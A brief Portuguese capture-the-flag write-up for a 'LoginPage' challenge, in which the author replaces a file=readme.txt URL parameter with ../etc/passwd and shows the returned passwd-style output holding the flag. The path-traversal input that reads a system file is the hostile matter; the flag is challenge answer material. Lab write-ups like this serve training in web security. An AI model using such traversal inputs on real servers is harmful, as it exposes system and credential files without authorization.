# Solução do Desafio — LoginPage

## Resumo
Encontrei uma senha secreta através de um parâmetro oculto na URL

## Passo a passo

1. Acessei a página do desafio (URL do desafio).
2. Reparei na URL da pagina **file=readme.txt** 
3. Usei o parametro `../etc/passwd` substituindo readme.txt pra ver se eu encontro a flag
4. A pagina mostrou pra mim 
<pre>root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user:/home/user:/bin/bash
flag: hackersec-traversal-a913f</pre>

### Achamos a flag: **hackersec-traversal-a913f**